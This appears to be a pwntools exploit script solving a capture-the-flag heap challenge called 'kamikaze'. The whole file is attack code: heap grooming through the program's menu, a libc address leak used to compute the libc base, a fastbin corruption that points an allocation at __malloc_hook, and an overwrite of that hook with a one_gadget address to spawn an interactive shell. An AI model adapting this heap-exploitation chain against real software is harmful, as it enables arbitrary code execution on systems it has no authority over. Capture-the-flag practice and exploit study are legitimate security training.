from pwn import *
def cmd(c):
	p.readuntil(">> ")
	p.sendline(str(c))
def add(weight,size,stanza,hook="".ljust(0x10,' ')):
	cmd(1)
	p.sendlineafter("Enter the weight of the song: ",str(weight))
	p.sendlineafter("Enter size of the stanza: ",str(size))
	p.sendlineafter("Enter the stanza: ",stanza)
	p.sendafter("Leave a short hook for it too: ",hook)
def edit(weight,stanza):
	cmd(2)
	p.sendlineafter("Enter song weight: ",str(weight))
	p.sendafter("Enter new stanza: ",stanza)
def free(weight):
	cmd(4)
	p.sendlineafter("Enter song weight: ",str(weight))
def show(idx):
	cmd(5)
	p.sendlineafter("Enter song index: ",str(idx))
def kamikaze(weight,seed=2):
	cmd(3)
	p.sendlineafter("Enter song weight: ",str(weight))
	p.sendlineafter("Enter seed: ",str(seed))
	
#context.log_level="debug"
p=process("./kamikaze")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
add(256,0x20,"")#head
add(1,0x70,"")
add(2,0x20,"")
free(1)
free(2)
add(3,0x70,"")
add(4,0x20,"","A"*0x10)
kamikaze(4)
for x in range(5,35):
	add(x,0x28,"")
add(36,0x70,"")
for x in range(5,35):
	free(x)
add(36,0x70,"")#0x0000555555757d70
add(37,0x70,"")

for x in range(5,29):
	add(x,0x28,"")

free(37)
free(28)

add(39,0x70,"")
add(40,0x28,"","C"*0x10)

kamikaze(40,4)
#                  top: 0x555555757de0 (size : 0x20) 
#       last_remainder: 0x555555757af0 (size : 0x360) 
#            unsortbin: 0x555555757af0 (size : 0x360)
#gdb.attach(p)
add(43,0x58,"")
add(44,0x40,"")
add(45,0x70,"")

show(3)
p.readuntil("Weight: ")
base=int(p.readline(),16)-(0x7ffff7dd1b78-0x00007ffff7a0d000)
log.warning(hex(base))
libc.address=base
free(3)
add(46,0x28,"")
add(47,0x28,"")
add(48,0x28,"")
add(49,0x28,p64(0)+p64(0x21001))
add(50,0x60,"")
add(51,0x60,"")
add(52,0x60,"")
add(53,0x30,"")
free(50)
cmd(1)
p.sendlineafter("Enter the weight of the song: ",str(54))
p.sendlineafter("Enter size of the stanza: ",str(0x58))
p.sendafter("Enter the stanza: ","\x00"*0x48+p64(0x71)+p64(libc.symbols['__malloc_hook']-35))
#add(53,0x50,p64(0)+p64(0x71)+)
free(46)
free(47)
one=base+0xf02a4

add(55,0x30,p64(0)+p64(0x0000000000020fa1))
add(55,0x30,"")
add(56,0x68,"")
add(57,0x68,"A"*19+p64(one))
free(0x39)

p.interactive()

